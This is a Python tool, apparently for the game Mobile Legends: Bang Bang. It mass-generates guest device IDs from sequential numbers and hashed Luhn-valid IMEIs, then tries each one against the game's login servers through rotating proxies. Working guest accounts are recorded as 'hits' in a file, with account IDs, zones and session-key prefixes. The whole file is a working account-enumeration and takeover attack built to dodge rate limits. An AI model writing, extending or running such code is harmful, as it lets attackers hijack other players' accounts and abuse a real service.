import sys, os, io, time, threading, datetime, hashlib, random, uuid, platform

if platform.system() == "Windows":
    import msvcrt
else:
    import select, termios, tty
    class msvcrt:
        @staticmethod
        def kbhit():
            r,_,_=select.select([sys.stdin],[],[],0)
            return bool(r)
        @staticmethod
        def getch():
            fd=sys.stdin.fileno()
            old=termios.tcgetattr(fd)
            try:
                tty.setcbreak(fd)
                return os.read(fd,1)
            finally:
                termios.tcsetattr(fd,termios.TCSADRAIN,old)

try: from colorama import Fore, Style
except: Fore = Style = type('_', (), {'__getattr__': lambda s, n: ''})()
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from device_login import _try_login, GLOBAL_SERVERS, query_game_server, _parse_proxy, _make_socket, _proxy_connect

_BASEDIR = os.path.dirname(os.path.abspath(__file__))
_HIT_FILE = os.path.join(_BASEDIR, "hit.txt")
_PROGRESS_FILE = os.path.join(_BASEDIR, "progress.json")

FILTER_MIN_YEAR = 2026
TIMEOUT = 2

ALL_ZERO_AID = '0000000000000000'
ALL_ZERO_UUID = '00000000-0000-0000-0000-000000000000'

KNOWN_IMEIS = [
    'cd9e459ea708a948d5c2f5a6ca8838cf',
    '00000000000000000000000000000000',
]

_MAP_IMEIS = []
_map_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'api', 'hehr-main', 'hehr-main', 'device_id_map.json')
if os.path.isfile(_map_path):
    try:
        import json
        with open(_map_path, 'r', encoding='utf-8') as f:
            _data = json.load(f)
        _MAP_IMEIS = list(set(v.split('_')[1] for v in _data.values() if v.startswith('and_')))
        print(f"  Loaded {len(_MAP_IMEIS)} IMEIs from device_id_map.json")
    except Exception as e:
        print(f"  (device_id_map.json load failed: {e})")

ALL_POOL_IMEIS = list(dict.fromkeys(KNOWN_IMEIS + _MAP_IMEIS))

DEFAULT_IMEI = 'cd9e459ea708a948d5c2f5a6ca8838cf'

SEEDS = [0x6ccadce0ecc34ebe, 0x6cdc094fd84dc37b, 0x6cde2a1b468b6ebc, 0x6ce6bdfe9d3d446c, 0x6cfbed4b10eea20f, 0x6d6d02ea51d2d851, 0x6d9ece1bea752a2f, 0x6da4d9e5df01ceba, 0x6dada3bb1b8ffac2, 0x6dae7dde7f6fb2da, 0x6dca6dcbafca5cd5, 0x6dd680a8da4faafe, 0x6ddbccbbbed126ad, 0x6dece9a9fbfeff5f, 0x6df55cd11d2ce4bb, 0x6dfdf15dfee3eaf4, 0x6e088b36eb327f22, 0x6e08f7eb5dfb34dc, 0x6e2868b4bfcb4d3e, 0x6e29a5aa2462c0ed, 0x6e33d4ef738e5ce4, 0x6e5b3b5dd3f41dc2, 0x6ea2cfde72f4d80a, 0x6ebed8b9c6d7dbfe, 0x6ec2df01b18743e0, 0x6ecbbe9cf84f5aca, 0x6ecf4baceccf7cd5, 0x6eddbffee4dc8fca, 0x6eeb88fe02ff11fa, 0x6ef463bfbcce84f7, 0x6ef6fabd6de6ef3c, 0x6ef9c0be702400bf, 0x6efa8feca02bbccc, 0x6efe1bbbacb3020c, 0x6efe38c924916fee, 0x6f0739cebbd3c921, 0x6f0fbcd165d209a9, 0x6f4b0eb6aebcd248, 0x6f8cbc3a1aa12dbb, 0x6fbddf538decfa8f, 0x6fbfeaaeb16343de, 0x6fdecb1d8da6aad3, 0x6feac3538e3debcc, 0x6ff4b8dcfead25e1, 0x6fff8774bf63ad5f, 0x70023a6e534bcf5c, 0x701c6ec37e3ca6c2, 0x7026b0bb8ebc16c0]

def gen_rand_aid():
    r = random.random()
    if r < 0.2: return f'{random.randint(0x6c00000000000000, 0x7200000000000000):016x}'
    elif r < 0.6: return f'{random.choice(SEEDS) + random.randint(-10000000, 10000000):016x}'
    return f'{random.choice(SEEDS) + random.randint(-1000000000, 1000000000):016x}'

def default_imei_devices(count):
    return [f'and_{DEFAULT_IMEI}{gen_rand_aid()}{uuid.uuid4()}' for _ in range(count)]

def guest_devices(count, include_known=True):
    results = []; pool = set()
    def add(md5):
        if md5 not in pool:
            pool.add(md5)
            results.append(f'and_{md5}{ALL_ZERO_AID}{ALL_ZERO_UUID}')
    if include_known:
        for im in ALL_POOL_IMEIS: add(im)
    n = random.randint(0, 9999999)
    while len(results) < count:
        imei_str = f'{n:015d}'; n += 1
        total = 0
        for i, d in enumerate(reversed(imei_str)):
            digit = int(d)
            if i % 2 == 1:
                digit *= 2
                if digit > 9: digit -= 9
            total += digit
        if total % 10 != 0: continue
        add(hashlib.md5(imei_str.encode()).hexdigest())
    return results[:count]

def test_proxy(proxy_dict):
    try:
        s = _make_socket(None)
        s.settimeout(5)
        _proxy_connect(s, GLOBAL_SERVERS[0][0], GLOBAL_SERVERS[0][1], proxy_dict)
        s.close()
        return True
    except:
        try: s.close()
        except: pass
        return False

def check(did, proxy=None):
    for host, port in GLOBAL_SERVERS:
        r = _try_login(did, host, port, TIMEOUT, proxy=proxy)
        if r is None: continue
        err = r.get('_error')
        if err: return None, f'err{err}'
        perr = r.get('_proxy_error')
        if perr: return None, perr
        acc = r.get('account_id', '')
        if not acc: return None, 'no_acc'
        yr = None; ts = r.get('creation_ts', 0)
        if ts:
            if ts > 1e12: ts /= 1000
            try: yr = datetime.datetime.fromtimestamp(ts).year
            except: pass
        if yr and yr >= FILTER_MIN_YEAR: return None, 'too_new'
        gs = query_game_server(acc, r.get('session_key',''), r.get('zone_id',0), timeout=2)
        if gs: return r, 'hit'
        return r, 'dead'
    return None, 'no_resp'

def run():
    from tqdm import tqdm

    print(f"\n  {'='*52}")
    print(f"  MLBB Device ID Tool")
    print(f"  {'='*52}\n")

    mode = (input("  Mode (generate/check) [check]: ").strip() or 'check').lower()

    if mode == 'generate':
        use_num = input("  Use numbered device IDs (and_1, and_2, ...)? (y/n) [n]: ").strip().lower() or 'n'
        if use_num == 'y':
            print(f"  ── Patterns ──")
            print(f"  [1] and_<N>           (simple number)")
            print(f"  [2] and_<N>_<N>        (two numbers)")
            print(f"  [3] and_0_0_<uuid(N)>  (real format with number UUID)")
            print(f"  [4] <N>               (raw number, no prefix)")
            print(f"  [5] ios_<N>           (iOS prefix)")
            p = input("  Pattern [1]: ").strip() or '1'
            rng = input("  Number (single or range like 30000000-50000000) [1]: ").strip()
            if not rng:
                start_n = end_n = 1
            elif '-' in rng:
                parts = rng.split('-', 1)
                start_n = int(parts[0].strip())
                end_n = int(parts[1].strip())
            else:
                start_n = end_n = int(rng.strip())
            count = end_n - start_n + 1
            if p == '2':
                lines = [f'and_{n}_{n}' for n in range(start_n, end_n + 1)]
            elif p == '3':
                lines = [f'and_0_0_{n}' for n in range(start_n, end_n + 1)]
            elif p == '4':
                lines = [f'{n}' for n in range(start_n, end_n + 1)]
            elif p == '5':
                lines = [f'ios_{n}' for n in range(start_n, end_n + 1)]
            else:
                lines = [f'and_{n}' for n in range(start_n, end_n + 1)]
            print(f"  Range: {start_n}-{end_n} ({count} device IDs)")
            out = input("  Save to file? (blank = print): ").strip()
            payload = '\n'.join(lines)
        else:
            use_def = input(f"  Use default IMEI ({DEFAULT_IMEI[:16]}...) only? (y/n) [n]: ").strip().lower() or 'n'
            count = int(input("  How many? [100]: ").strip() or "100")
            if use_def == 'y':
                lines = default_imei_devices(count)
            else:
                lines = guest_devices(count, include_known=True)
            out = input("  Save to file? (blank = print): ").strip()
            payload = '\n'.join(lines)
        if out:
            with open(out, 'w', encoding='utf-8') as f: f.write(payload + '\n')
            print(f"  Saved {len(lines)} device IDs to {out}")
        else:
            print(f"\n{payload}\n")
        return

    # ── Proxy file ──
    proxy_list = []
    pf = input("  Proxy file (user:pass@host:port per line, blank=none)?: ").strip()
    if pf and os.path.isfile(pf):
        with open(pf, 'r', encoding='utf-8') as f:
            raw = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        proxy_list = [p for r in raw if (p := _parse_proxy(r)) is not None]
        print(f"  Loaded {len(proxy_list)} proxies from {pf}")

        check_p = input("  Check proxies first? (y/n) [y]: ").strip().lower() or 'y'
        if check_p == 'y' and proxy_list:
            n_threads = min(50, len(proxy_list))
            good = [None] * len(proxy_list)
            lock = threading.Lock()

            def proxy_checker(pi):
                ok = test_proxy(proxy_list[pi])
                with lock: good[pi] = ok

            with tqdm(total=len(proxy_list), desc="  Proxies", unit="p", ncols=80) as pbar:
                def worker_wrapper(idx):
                    proxy_checker(idx)
                    pbar.update(1)

                ts = [threading.Thread(target=worker_wrapper, args=(i,)) for i in range(len(proxy_list))]
                for t in ts: t.start()
                for t in ts: t.join()

            ok_count = sum(1 for g in good if g)
            print(f"    OK: {ok_count}/{len(proxy_list)}")
            proxy_list = [proxy_list[i] for i in range(len(proxy_list)) if good[i]]

    # ── Device counts ──
    resume_mode = False
    resume_idx = 0
    progress = None
    p = None
    if os.path.isfile(_PROGRESS_FILE):
        try:
            import json as _json
            with open(_PROGRESS_FILE, 'r', encoding='utf-8') as f:
                progress = _json.load(f)
            print(f"\n  {Fore.YELLOW}Saved progress found: {progress.get('start_n')}-{progress.get('end_n')} pattern={progress.get('pattern')} checked={progress.get('checked')}/{progress.get('total')}{Style.RESET_ALL}")
            resume = input("  Resume? (y/n) [y]: ").strip().lower() or 'y'
            if resume == 'y':
                resume_mode = True
                resume_idx = progress.get('checked', 0)
                start_n = progress['start_n']
                end_n = progress['end_n']
                p = progress.get('pattern', '1')
        except Exception:
            progress = None

    if not resume_mode:
        use_num = input("  Use numbered device IDs (and_1, and_2, ...)? (y/n) [n]: ").strip().lower() or 'n'
        if use_num == 'y':
            print(f"  ── Patterns ──")
            print(f"  [1] and_<N>           (simple number)")
            print(f"  [2] and_<N>_<N>        (two numbers)")
            print(f"  [3] and_0_0_<uuid(N)>  (real format with number UUID)")
            print(f"  [4] <N>               (raw number, no prefix)")
            print(f"  [5] ios_<N>           (iOS prefix)")
            p = input("  Pattern [1]: ").strip() or '1'
            rng = input("  Number (single or range like 30000000-50000000) [1]: ").strip()
            if not rng:
                start_n = end_n = 1
            elif '-' in rng:
                parts = rng.split('-', 1)
                start_n = int(parts[0].strip())
                end_n = int(parts[1].strip())
            else:
                start_n = end_n = int(rng.strip())
        else:
            use_def = input(f"  Use default IMEI ({DEFAULT_IMEI[:16]}...) only? (y/n) [n]: ").strip().lower() or 'n'
            if use_def == 'y':
                imei_count = int(input("  Devices to generate? [100]: ").strip() or "100")
                p = None
                start_n = end_n = 0
            else:
                imei_count = int(input("  Guest IMEIs to scan? [100]: ").strip() or "100")
                p = None
                start_n = end_n = 0

    # Build test_list
    if resume_mode or (use_num == 'y' if not resume_mode else False):
        if p == '2':
            test_list = [f'and_{n}_{n}' for n in range(start_n, end_n + 1)]
        elif p == '3':
            test_list = [f'and_0_0_{n}' for n in range(start_n, end_n + 1)]
        elif p == '4':
            test_list = [f'{n}' for n in range(start_n, end_n + 1)]
        elif p == '5':
            test_list = [f'ios_{n}' for n in range(start_n, end_n + 1)]
        else:
            test_list = [f'and_{n}' for n in range(start_n, end_n + 1)]
        print(f"  Range: {start_n}-{end_n} ({len(test_list)} device IDs)")
        threads = int(input("  Threads [5]: ").strip() or "5")
    elif not resume_mode:
        test_list = default_imei_devices(imei_count) if use_def == 'y' else list(dict.fromkeys(guest_devices(imei_count, include_known=True)))
        threads = int(input("  Threads [5]: ").strip() or "5")

    if resume_mode and resume_idx > 0:
        test_list = test_list[resume_idx:]
        print(f"  Resumed from #{resume_idx}, {len(test_list)} remaining")

    # ── Shared hit save lock ──
    save_lock = threading.Lock()
    hit_count = [0]

    def save_hit(v):
        with save_lock:
            hit_count[0] += 1
            n = hit_count[0]
            with open(_HIT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"\n===== HIT #{n} @ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====\n\n")
                f.write(f"  Device ID   : {v['device_id']}\n")
                f.write(f"  Account ID  : {v['account_id']}\n")
                f.write(f"  Zone ID     : {v['zone_id']}\n")
                f.write(f"  Server      : {v['server']}\n")
                f.write(f"  Session Key : {v['session_key'][:40]}...\n")
                f.write(f"  {'-'*50}\n")

    hits, dead = [], []
    idx_lock = threading.Lock()
    idx = 0
    t0 = time.time()
    pause_event = threading.Event()
    pause_event.set()
    paused = [False]

    def save_progress(checked):
        if p is not None:
            try:
                import json as _json
                with open(_PROGRESS_FILE, 'w', encoding='utf-8') as f:
                    _json.dump({'start_n': start_n, 'end_n': end_n, 'pattern': p, 'checked': checked, 'total': len(test_list)}, f)
            except Exception:
                pass

    def keyboard_listener():
        while not stop_event.is_set():
            if msvcrt.kbhit():
                ch = msvcrt.getch()
                if ch == b' ':
                    if paused[0]:
                        paused[0] = False
                        pause_event.set()
                        pbar.write(f"  {Fore.GREEN}▶ RESUMED{Style.RESET_ALL}")
                    else:
                        paused[0] = True
                        pause_event.clear()
                        with idx_lock:
                            save_progress(idx)
                        pbar.write(f"  {Fore.YELLOW}⏸ PAUSED (press SPACE to resume){Style.RESET_ALL}")
            time.sleep(0.05)

    stop_event = threading.Event()
    listener = threading.Thread(target=keyboard_listener, daemon=True)
    listener.start()

    pbar = tqdm(total=len(test_list), desc="  Checking", unit="d", ncols=80,
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]')

    def worker():
        nonlocal idx
        while True:
            pause_event.wait()
            with idx_lock:
                if idx >= len(test_list):
                    pbar.update(0)
                    return
                i = idx; idx += 1
            did = test_list[i]
            proxy = random.choice(proxy_list) if proxy_list else None
            info, reason = check(did, proxy=proxy)
            if info and reason == 'hit':
                hits.append(info)
                save_hit(info)
                pbar.write(f"  HIT  acc={info['account_id']} zone={info['zone_id']}")
            elif info:
                dead.append(info)
                pbar.write(f"  DEAD acc={info['account_id']} zone={info['zone_id']}")
            pbar.update(1)

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    try:
        for t in ts: t.join()
    except KeyboardInterrupt:
        with idx_lock:
            checked = idx
        save_progress(checked)
        print(f"\n  {Fore.YELLOW}Paused — progress saved. Run again to resume from #{checked}.{Style.RESET_ALL}")
        stop_event.set()
        pbar.close()
        return
    stop_event.set()
    pbar.close()
    elapsed = time.time() - t0

    if os.path.isfile(_PROGRESS_FILE):
        try: os.remove(_PROGRESS_FILE)
        except Exception: pass

    print(f"\n  {'='*52}")
    print(f"  Checked: {len(test_list)} in {elapsed:.0f}s ({len(test_list)/max(elapsed,0.1):.0f}/s)")
    print(f"  HITS   : {len(hits)}")
    print(f"  DEAD   : {len(dead)}")
    if proxy_list:
        print(f"  Proxies: {len(proxy_list)} working")
    print(f"  {'='*52}")
    
    again = input(f"\n  Run again? (y/n) [n]: ").strip().lower()
    if again == 'y':
        run()

if __name__ == '__main__':
    run()
